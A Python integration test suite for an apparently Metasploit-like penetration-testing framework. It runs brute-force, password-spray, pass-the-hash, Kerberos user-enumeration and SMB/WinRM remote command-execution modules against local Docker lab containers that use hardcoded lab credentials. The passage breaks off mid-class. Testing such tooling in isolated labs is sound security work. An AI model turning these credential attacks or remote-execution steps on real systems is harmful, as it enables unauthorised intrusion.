"""Integration tests against real lab containers.

Skipped entirely when the docker daemon is unreachable, so the suite stays
green on machines without docker running. With docker up, this exercises the
full loop: lab up -> module against real service -> assertions -> lab down.

Run: python3 -m unittest discover -s tests
"""

import base64
import contextlib
import http.client
import importlib.util
import io
import os
import shutil
import socket
import subprocess
import sys
import time
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from core import output  # noqa: E402
from core.console import FrameworkConsole  # noqa: E402
from core.lab import LabManager  # noqa: E402
from core.registry import ModuleRegistry  # noqa: E402
from core.store import Store  # noqa: E402

output.color_enabled = False

HOST = "127.0.0.1"
PORT = 18080


def docker_available():
    if not shutil.which("docker"):
        return False
    try:
        proc = subprocess.run(
            ["docker", "info"], capture_output=True, timeout=15
        )
        return proc.returncode == 0
    except Exception:
        return False


def get(path, headers=None):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
    try:
        conn.request("GET", path, headers=headers or {})
        resp = conn.getresponse()
        resp.read()
        return resp.status
    finally:
        conn.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
class _WebLabCase(unittest.TestCase):
    """Shared fixture: web lab up before the class, down after."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("web")
        deadline = time.time() + 30
        while True:
            try:
                if get("/") == 200:
                    break
            except OSError:
                pass
            if time.time() > deadline:
                cls.manager.down("web")
                raise RuntimeError("web lab did not come up within 30s")
            time.sleep(0.5)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("web")

    def setUp(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        self.console = FrameworkConsole(registry, Store(":memory:"))

    def tearDown(self):
        self.console.store.close()

    def console_out(self, *commands):
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            for command in commands:
                self.console.onecmd(command)
        return buf.getvalue()


class TestWebLab(_WebLabCase):
    def test_http_headers_module_against_lab(self):
        out = self.console_out(
            "use auxiliary/scanner/http_headers",
            f"set RHOSTS {HOST}",
            f"set RPORT {PORT}",
            "run",
        )
        self.assertIn("FrameworkLab", out)
        services = self.console.store.services(HOST)
        self.assertEqual([s["port"] for s in services], [PORT])

    def test_dir_busting_fixture(self):
        # the contract a dir-buster module must handle: real 200s, a 403,
        # a 401, and decoy 404s (see labs/web/wordlists/dirs.txt)
        for path, want in (
            ("/admin", 200), ("/backup", 200), ("/secret", 200),
            ("/forbidden", 403), ("/protected", 401), ("/wp-admin", 404),
        ):
            self.assertEqual(get(path), want, path)

    def test_basic_auth_fixture(self):
        self.assertEqual(get("/protected"), 401)
        creds = base64.b64encode(b"admin:hunter2").decode()
        self.assertEqual(
            get("/protected", {"Authorization": f"Basic {creds}"}), 200
        )


class TestHttpLoginLab(_WebLabCase):
    def _run_login(self, mode, path, extra):
        wordlist = ROOT / "labs" / "web" / "wordlists" / "passwords.txt"
        return self.console_out(
            "use auxiliary/login/http_login",
            f"set RHOSTS {HOST}",
            f"set RPORT {PORT}",
            f"set MODE {mode}",
            f"set TARGETPATH {path}",
            "set USERNAME admin",
            f"set PASS_FILE {wordlist}",
            *extra,
            "run",
        )

    def test_basic_mode_finds_cred(self):
        out = self._run_login("basic", "/protected", [])
        self.assertIn("admin:hunter2", out)
        creds = self.console.store.creds()
        self.assertEqual(len(creds), 1)
        self.assertEqual(creds[0]["username"], "admin")
        self.assertEqual(creds[0]["password"], "hunter2")
        self.assertEqual(creds[0]["service"], "http")

    def test_form_mode_finds_cred_with_baseline(self):
        # no SUCCESS/FAILURE strings set: baseline deviation must do the job
        out = self._run_login("form", "/login", [])
        self.assertIn("admin:hunter2", out)
        self.assertEqual(len(self.console.store.creds()), 1)
        # second run: stored creds are tried first — findings compound
        out2 = self._run_login("form", "/login", [])
        self.assertIn("stored credential", out2)

    def test_wrong_password_no_false_positive(self):
        out = self.console_out(
            "use auxiliary/login/http_login",
            f"set RHOSTS {HOST}",
            f"set RPORT {PORT}",
            "set MODE basic",
            "set TARGETPATH /protected",
            "set USERNAME admin",
            "set PASSWORD definitely-wrong",
            "run",
        )
        self.assertNotIn("[+]", out)
        self.assertEqual(self.console.store.creds(), [])


class TestDirBusterLab(_WebLabCase):
    def test_dirbuster_finds_hits_filters_decoys(self):
        wordlist = ROOT / "labs" / "web" / "wordlists" / "dirs.txt"
        out = self.console_out(
            "use auxiliary/scanner/dir_buster",
            f"set RHOSTS {HOST}",
            f"set RPORT {PORT}",
            f"set WORDLIST {wordlist}",
            "run",
        )
        # every real hit, across statuses
        for hit in ("/admin", "/backup", "/secret", "/uploads", "/api", "/docs"):
            self.assertIn(hit, out)
        self.assertIn("403 /forbidden", out)
        self.assertIn("401 /protected", out)
        # decoys must not appear as findings
        self.assertNotIn("/wp-admin", out)
        self.assertNotIn("/phpmyadmin", out)
        self.assertNotIn("/config", out)
        # findings recorded as loot
        loot = self.console.store.loot("web-dirs")
        self.assertEqual(len(loot), 1)
        self.assertIn("/admin", loot[0]["content"])

    def test_recursion_finds_depth_two(self):
        wordlist = ROOT / "labs" / "web" / "wordlists" / "dirs.txt"
        out = self.console_out(
            "use auxiliary/scanner/dir_buster",
            f"set RHOSTS {HOST}",
            f"set RPORT {PORT}",
            f"set WORDLIST {wordlist}",
            "set RECURSE true",
            "set MAX_DEPTH 2",
            "run",
        )
        # panel/db 404 at root but exist under /admin and /backup
        self.assertIn("/admin/panel", out)
        self.assertIn("/backup/db", out)
        self.assertNotIn("[+] 404", out)

    def test_spa_canary_and_content_validation(self):
        wordlist = ROOT / "labs" / "web" / "wordlists" / "canary.txt"
        out = self.console_out(
            "use auxiliary/scanner/dir_buster",
            f"set RHOSTS {HOST}",
            f"set RPORT {PORT}",
            f"set WORDLIST {wordlist}",
            "run",
        )
        # the SPA catch-all (varying nonce) must be detected and suppressed
        self.assertIn("catch-all", out)
        for suppressed in ("/app/config", "/app/admin", "/app/panel",
                           "/app/dashboard"):
            self.assertNotIn(f"200 {suppressed}", out)
        # a real .env passes content validation
        self.assertIn("200 /.env", out)
        # an HTML page at .env does not
        self.assertNotIn("200 /decoy.env", out)
        # only the real .env lands in loot
        loot = self.console.store.loot("web-dirs")
        if loot:
            self.assertIn("/.env", loot[0]["content"])
            self.assertNotIn("app/", loot[0]["content"])
            self.assertNotIn("decoy", loot[0]["content"])


@unittest.skipUnless(docker_available(), "docker daemon not available")
class TestSshLab(unittest.TestCase):
    """Smoke test: the ssh lab builds, starts, and speaks SSH."""

    SSH_PORT = 12222

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("ssh")
        cls.banner = ""
        deadline = time.time() + 30
        while time.time() < deadline:
            try:
                with socket.create_connection((HOST, cls.SSH_PORT), timeout=2) as s:
                    cls.banner = s.recv(64).decode(errors="replace").strip()
                    if cls.banner:
                        break
            except OSError:
                time.sleep(0.5)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ssh")

    def test_ssh_banner(self):
        self.assertTrue(
            self.banner.startswith("SSH-"),
            f"expected an SSH banner, got {self.banner!r}",
        )


def paramiko_available():
    return importlib.util.find_spec("paramiko") is not None


def pywinrm_available():
    return importlib.util.find_spec("winrm") is not None

@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(paramiko_available(), "paramiko not installed")
class TestSshLoginLab(unittest.TestCase):
    """ssh_login against the real ssh lab container."""

    SSH_PORT = 12222

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("ssh")
        deadline = time.time() + 30
        while time.time() < deadline:
            try:
                with socket.create_connection((HOST, cls.SSH_PORT), timeout=2) as s:
                    if s.recv(64):
                        break
            except OSError:
                time.sleep(0.5)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ssh")

    def test_ssh_brute_finds_cred(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            wordlist = ROOT / "labs" / "web" / "wordlists" / "passwords.txt"
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/login/ssh_login",
                    f"set RHOSTS {HOST}",
                    f"set RPORT {self.SSH_PORT}",
                    "set USERNAME admin",
                    f"set PASS_FILE {wordlist}",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertIn("admin:admin", out)
            creds = console.store.creds()
            self.assertEqual(len(creds), 1)
            self.assertEqual(creds[0]["service"], "ssh")
        finally:
            console.store.close()


def impacket_available():
    return importlib.util.find_spec("impacket") is not None


def winrm_available():
    return importlib.util.find_spec("winrm") is not None


def windows_lab_enabled():
    """Opt-in: first boot installs Windows (~20 min), so this is off
    unless FORGE_WINDOWS_LAB=1 is set in the environment."""
    return os.environ.get("FORGE_WINDOWS_LAB") == "1"


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestSmbLoginLab(unittest.TestCase):
    """smb_login against the smb lab container (labuser:labpass @10445)."""

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("smb")
        deadline = time.time() + 30
        while time.time() < deadline:
            try:
                SMBConnection(HOST, HOST, sess_port=10445, timeout=2).close()
                break
            except Exception:
                time.sleep(0.5)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("smb")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.creds()
        finally:
            console.store.close()

    def test_hit_and_miss(self):
        # NOTE: this lab sets "map to guest = Bad User", so unknown users
        # authenticate as guest with ANY password — user-existence can only
        # be tested against the AD lab, not here.
        out, creds = self._run(
            "use auxiliary/login/smb_login",
            f"set RHOSTS {HOST}",
            "set RPORT 10445",
            "set USERNAME labuser",
            "set PASSWORD labpass",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("valid credential .\\labuser:labpass", out)
        self.assertIn("1 valid", out)
        self.assertEqual(len(creds), 1)
        self.assertEqual(creds[0]["service"], "smb")
        self.assertEqual(creds[0]["username"], "labuser")

        out, creds = self._run(
            "use auxiliary/login/smb_login",
            f"set RHOSTS {HOST}",
            "set RPORT 10445",
            "set USERNAME labuser",
            "set PASSWORD wrongpass",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("0 valid", out)
        self.assertEqual(creds, [])


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestSmbLoginAdLab(unittest.TestCase):
    """smb_login domain creds + pass-the-hash against the AD lab."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.creds()
        finally:
            console.store.close()

    def test_domain_creds(self):
        out, creds = self._run(
            "use auxiliary/login/smb_login",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME ghostuser,analyst",
            "set PASSWORD Summer2024!",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("valid credential forge.local\\analyst:Summer2024!", out)
        self.assertEqual(len(creds), 1)

    def test_pass_the_hash(self):
        from Cryptodome.Hash import MD4
        h = MD4.new()
        h.update("Summer2024!".encode("utf-16-le"))
        out, creds = self._run(
            "use auxiliary/login/smb_login",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst",
            f"set NTHASH {h.hexdigest()}",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("valid credential forge.local\\analyst", out)
        self.assertEqual(len(creds), 1)


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestKerberosLoginLab(unittest.TestCase):
    """kerberos_login VALIDATE + ENUM against the AD lab KDC."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.creds()
        finally:
            console.store.close()

    def test_validate_good_bad_ghost(self):
        out, creds = self._run(
            "use auxiliary/login/kerberos_login",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst,ghostuser,Administrator",
            "set PASSWORD Summer2024!",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("valid credential analyst:Summer2024!", out)
        self.assertIn("1 valid", out)
        self.assertEqual(len(creds), 1)
        self.assertEqual(creds[0]["service"], "kerberos")

    def test_enum_oracle(self):
        out, _ = self._run(
            "use auxiliary/login/kerberos_login",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst,noauth,ghostuser,Administrator",
            "set ENUM true",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("analyst — exists", out)
        self.assertIn("Administrator — exists", out)
        # noauth's DONT_REQ_PREAUTH surfaces as an AS-REP — bonus signal
        self.assertIn("noauth — exists (AS-REP", out)
        self.assertNotIn("ghostuser — exists", out)


@unittest.skipUnless(docker_available(), "docker daemon not available")
class TestSnmpLoginLab(unittest.TestCase):
    """snmp_login against the snmp lab: only 'private-lab' answers."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("snmp")
        from core import snmp as core_snmp
        deadline = time.time() + 30
        while time.time() < deadline:
            try:
                if core_snmp.query(HOST, 10161, "private-lab", timeout=2):
                    break
            except Exception:
                time.sleep(1)
        else:
            cls.manager.down("snmp")
            raise RuntimeError("snmp lab not up within 30s")

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("snmp")

    def test_spray_hits_and_reads_silence_honestly(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/login/snmp_login",
                    f"set RHOSTS {HOST}",
                    "set RPORT 10161",
                    "set COMMUNITIES public,private,private-lab,admin",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("community 'private-lab'", out)
            self.assertIn("1 valid, 3 inconclusive", out)
            creds = console.store.creds()
            self.assertEqual(len(creds), 1)
            self.assertEqual(creds[0]["service"], "snmp")
            self.assertEqual(creds[0]["password"], "private-lab")
            services = console.store.services()
            self.assertTrue(any(s["name"] == "snmp" for s in services))
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestLdapLoginLab(unittest.TestCase):
    """ldap_login simple binds against the AD lab."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.creds()
        finally:
            console.store.close()

    def test_hit_and_miss(self):
        out, creds = self._run(
            "use auxiliary/login/ldap_login",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME ghostuser,analyst",
            "set PASSWORD Summer2024!",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("valid credential analyst:Summer2024!", out)
        self.assertIn("1 valid", out)
        self.assertEqual(len(creds), 1)
        self.assertEqual(creds[0]["service"], "ldap")

    def test_wrong_password_clean(self):
        out, creds = self._run(
            "use auxiliary/login/ldap_login",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst",
            "set PASSWORD wrongpass",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("0 valid", out)
        self.assertEqual(creds, [])


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestMultiSprayLab(unittest.TestCase):
    """multi_spray: one cred across the services table (ad + ssh labs)."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)
        cls.manager.up("ssh")
        deadline = time.time() + 40
        while time.time() < deadline:
            try:
                with socket.create_connection((HOST, 12222), timeout=2) as s:
                    if s.recv(64):
                        break
            except OSError:
                time.sleep(1)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ssh")
        cls.manager.down("ad")

    def test_store_driven_spray(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            store = console.store
            store.add_host(HOST)
            store.add_service(HOST, 445, name="smb")
            store.add_service(HOST, 88, name="kerberos")
            store.add_service(HOST, 389, name="ldap")
            store.add_service(HOST, 12222, name="ssh")
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/login/multi_spray",
                    "set USERNAME analyst",
                    "set PASSWORD Summer2024!",
                    "set DOMAIN forge.local",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            for proto in ("kerberos", "ldap", "smb"):
                self.assertIn(f"{proto}: VALID", out)
            self.assertIn("no account lockout policy", out)
            # ssh respects the stored non-default port (12222, not 22)
            self.assertIn("ssh:", out)
            creds = {(c["service"], c["username"]) for c in store.creds()}
            for proto in ("kerberos", "ldap", "smb"):
                self.assertIn((proto, "analyst"), creds)
        finally:
            console.store.close()

    def test_ssh_hit_on_stored_port(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            store = console.store
            store.add_host(HOST)
            store.add_service(HOST, 12222, name="ssh")
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/login/multi_spray",
                    "set USERNAME admin",
                    "set PASSWORD admin",
                    "set DOMAIN .",
                    "set PROTOCOLS ssh",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("ssh: VALID", out)
            self.assertIn("ssh admin@", out)
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestMssqlLoginLab(unittest.TestCase):
    """mssql_login against the mssql lab (sa @11433)."""

    @classmethod
    def setUpClass(cls):
        from impacket.tds import MSSQL

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("mssql")
        deadline = time.time() + 120
        while time.time() < deadline:
            try:
                s = MSSQL(HOST, 11433)
                s.connect()
                if s.login("master", "sa", "For9e_SQL!2024"):
                    s.disconnect()
                    break
            except Exception:
                time.sleep(2)
        else:
            cls.manager.down("mssql")
            raise RuntimeError("mssql lab not up within 120s")

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("mssql")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.creds()
        finally:
            console.store.close()

    def test_hit_and_miss(self):
        out, creds = self._run(
            "use auxiliary/login/mssql_login",
            f"set RHOSTS {HOST}",
            "set RPORT 11433",
            "set USERNAME ghostuser,sa",
            "set PASSWORD For9e_SQL!2024",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("valid credential sa:For9e_SQL!2024", out)
        self.assertIn("1 valid", out)
        self.assertEqual(len(creds), 1)
        self.assertEqual(creds[0]["service"], "mssql")

        out, creds = self._run(
            "use auxiliary/login/mssql_login",
            f"set RHOSTS {HOST}",
            "set RPORT 11433",
            "set USERNAME sa",
            "set PASSWORD wrongpass",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("0 valid", out)
        self.assertEqual(creds, [])


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(winrm_available(), "pywinrm not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestProcWatchLab(unittest.TestCase):
    """proc_watch against the windows lab: a watcher catches the service
    spawn that smb_exec creates, in real time."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("windows")
        # poll a REAL WinRM handshake: docker-proxy accepts tcp long
        # before the guest's WinRM service answers (same lie as LDAP)
        import winrm
        deadline = time.time() + 420
        while time.time() < deadline:
            try:
                s = winrm.Session("http://127.0.0.1:15985/wsman",
                                  auth=("labadmin", "Labpass2024!"),
                                  transport="ntlm",
                                  server_cert_validation="ignore",
                                  operation_timeout_sec=10,
                                  read_timeout_sec=11)
                if s.run_cmd("whoami").status_code == 0:
                    break
            except Exception:
                time.sleep(5)
        else:
            cls.manager.down("windows")
            raise RuntimeError("windows lab WinRM not answering within 420s")

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("windows")

    def test_catches_service_spawn(self):
        import threading

        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            # NOTE: redirect_stdout is process-global — one outer capture
            # for both threads, never a redirect per thread
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                def watch():
                    for command in (
                        "use auxiliary/enum/proc_watch",
                        f"set RHOSTS {HOST}",
                        "set RPORT 15985",
                        "set USERNAME labadmin",
                        "set PASSWORD Labpass2024!",
                        "set INTERVAL 1",
                        "set DURATION 12",
                        "run",
                    ):
                        console.onecmd(command)

                t = threading.Thread(target=watch)
                t.start()
                time.sleep(3)  # let the baseline snapshot land
                for command in (
                    "use exploits/windows/smb_exec",
                    f"set RHOSTS {HOST}",
                    "set RPORT 1445",
                    "set USERNAME labadmin",
                    "set PASSWORD Labpass2024!",
                    # long-lived spawn: the service's cmd->ping tree lives
                    # for minutes, so even a 1s poll catches it reliably
                    "set COMMAND ping -t 127.0.0.1",
                    "set TIMEOUT 5",
                    "run",
                ):
                    console.onecmd(command)
                t.join(timeout=20)
                # clean up the orphan ping tree on the guest
                for command in (
                    "use exploits/windows/smb_exec",
                    f"set RHOSTS {HOST}",
                    "set RPORT 1445",
                    "set USERNAME labadmin",
                    "set PASSWORD Labpass2024!",
                    "set COMMAND taskkill /f /im ping.exe",
                    "run",
                ):
                    console.onecmd(command)
            self.assertFalse(t.is_alive(), "watcher did not finish")
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            # the exec side's always-on status line (the "started" string
            # is a debug-only print — never assert on that one)
            self.assertIn("launched", out)
            self.assertIn("cmd.exe", out)
            loot = console.store.loot("proc-watch")
            self.assertEqual(len(loot), 1)
            self.assertIn("cmd.exe", loot[0]["content"])
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(winrm_available(), "pywinrm not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestWinrmLoginLab(unittest.TestCase):
    """winrm_login against the windows lab's WinRM (15985)."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("windows")
        # TCP-connect readiness is not enough: docker's port proxy
        # answers long before the WinRM service inside Windows does —
        # probe the actual HTTP listener (/wsman answers 405/401)
        deadline = time.time() + 300
        while time.time() < deadline:
            try:
                with socket.create_connection((HOST, 15985), timeout=3) as s:
                    s.sendall(b"GET /wsman HTTP/1.0\r\n\r\n")
                    if s.recv(64).startswith(b"HTTP/"):
                        break
            except OSError:
                pass
            time.sleep(5)
        else:
            cls.manager.down("windows")
            raise RuntimeError("windows lab WinRM not up within 300s")

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("windows")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.creds()
        finally:
            console.store.close()

    def test_hit_and_miss(self):
        out, creds = self._run(
            "use auxiliary/login/winrm_login",
            f"set RHOSTS {HOST}",
            "set RPORT 15985",
            "set USERNAME ghostuser,labadmin",
            "set PASSWORD Labpass2024!",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("valid credential labadmin:Labpass2024!", out)
        self.assertIn("evil-winrm", out)
        self.assertEqual(len(creds), 1)
        self.assertEqual(creds[0]["service"], "winrm")


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(pywinrm_available(), "pywinrm not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestWinrmExecLab(unittest.TestCase):
    """winrm_exec against the windows lab's WinRM (15985): real command
    execution over /wsman, cmd and PowerShell, output looted."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("windows")
        # same protocol-level readiness as winrm_login's class: the port
        # proxy answers long before the WinRM service inside Windows does
        deadline = time.time() + 300
        while time.time() < deadline:
            try:
                with socket.create_connection((HOST, 15985), timeout=3) as s:
                    s.sendall(b"GET /wsman HTTP/1.0\r\n\r\n")
                    if s.recv(64).startswith(b"HTTP/"):
                        break
            except OSError:
                pass
            time.sleep(5)
        else:
            cls.manager.down("windows")
            raise RuntimeError("windows lab WinRM not up within 300s")

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("windows")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return (buf.getvalue(), console.store.loot("exec"),
                    console.store.creds())
        finally:
            console.store.close()

    def test_cmd_exec_and_loot(self):
        out, loot, creds = self._run(
            "use exploits/windows/winrm_exec",
            f"set RHOSTS {HOST}",
            "set RPORT 15985",
            "set USERNAME labadmin",
            "set PASSWORD Labpass2024!",
            "set COMMAND whoami",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("labadmin", out.lower())
        self.assertEqual(len(loot), 1)
        self.assertIn("labadmin", loot[0]["content"].lower())
        self.assertTrue(any(c["service"] == "winrm" for c in creds))

    def test_powershell_exec(self):
        out, _loot, _creds = self._run(
            "use exploits/windows/winrm_exec",
            f"set RHOSTS {HOST}",
            "set RPORT 15985",
            "set USERNAME labadmin",
            "set PASSWORD Labpass2024!",
            "set SHELL powershell",
            "set COMMAND $PSVersionTable.PSVersion.Major",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertRegex(out, r"\b5\b|\b7\b")

    def test_check_reports_session(self):
        out, _loot, _creds = self._run(
            "use exploits/windows/winrm_exec",
            f"set RHOSTS {HOST}",
            "set RPORT 15985",
            "set USERNAME labadmin",
            "set PASSWORD Labpass2024!",
            "check",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("WinRM session works as", out)


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestWindowsLab(unittest.TestCase):
    """windows lab: real Windows Server answers SMB with the lab creds."""

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("windows")
        # READY's tcp check lies: docker-proxy accepts 1445 the moment the
        # container starts, minutes before the guest's SMB stack answers.
        # Poll a real login — cold installs take ~15 min, persisted disks
        # seconds, so the window covers the cold case.
        deadline = time.time() + 1200
        while time.time() < deadline:
            try:
                conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=10)
                conn.login("labadmin", "Labpass2024!")
                conn.close()
                break
            except Exception:
                time.sleep(5)
        else:
            cls.manager.down("windows")
            raise RuntimeError("windows lab guest SMB not up within 1200s")

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("windows")

    def test_smb_login_and_admin_share(self):
        from impacket.smbconnection import SMBConnection

        conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=15)
        try:
            conn.login("labadmin", "Labpass2024!")
            # psexec's precondition: ADMIN$ must be reachable
            conn.connectTree("ADMIN$")
        finally:
            conn.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestAdProbeWindowsLab(unittest.TestCase):
    """ad_probe against the windows lab (Server 2022): the hardened-EPM
    path — direct interface binds with creds find PrinterBug."""

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("windows")
        deadline = time.time() + 300
        while time.time() < deadline:
            try:
                conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=10)
